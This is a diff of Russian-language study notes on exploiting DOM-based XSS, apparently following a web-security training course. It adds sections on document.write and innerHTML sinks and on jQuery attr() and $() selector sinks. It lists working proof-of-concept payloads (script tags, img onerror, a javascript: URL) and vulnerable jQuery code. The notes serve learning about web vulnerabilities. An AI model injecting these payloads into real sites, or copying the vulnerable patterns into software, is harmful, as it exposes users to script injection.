@@ -63,15 +63,34 @@ Database
     * Обнаружив приемник, которому назначаются данные, полученные из источника, использовать отладчик для проверки значения. (наведя курсор на переменную, чтобы увидеть её значение перед отправкой в ​​приемник.)
   * * **Тестирование на DOM XSS с помощью DOM Invader**
    
+##  Эксплуатация DOM XSS
 
-* source location.search -> приёмник document.write
+* **source location.search -> приёмник document.write**
 ```
 <script>alert(document.domain)</script>
 product?productId=1&storeId=London%27><script>alert("XXX")</script>
 ```
-* Приёмник innerHTML не принимает элементы скрипта
+* **Приёмник innerHTML не принимает элементы скрипта**
 ```
 <img src=1 onerror=alert(document.domain)>
 ```
 
-* **Источники и приемники в сторонних зависимостях**
+### **Источники и приемники в сторонних зависимостях**
+
+* **jQuery**
+> функция attr() - может изменять атрибуты элементов DOM.
+```
+$(function() {
+$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
+});
+
+?returnUrl=javascript:alert(document.domain)
+```
+> селекторная функция $() - может использоваться для внедрения вредоносных объектов в DOM.
+> location.hash - для анимации или автоматической прокрутки к определённому элементу на странице + обработчик событий hashchange
+```
+$(window).on('hashchange', function() {
+var element = $(location.hash);
+element[0].scrollIntoView();
+});
+```
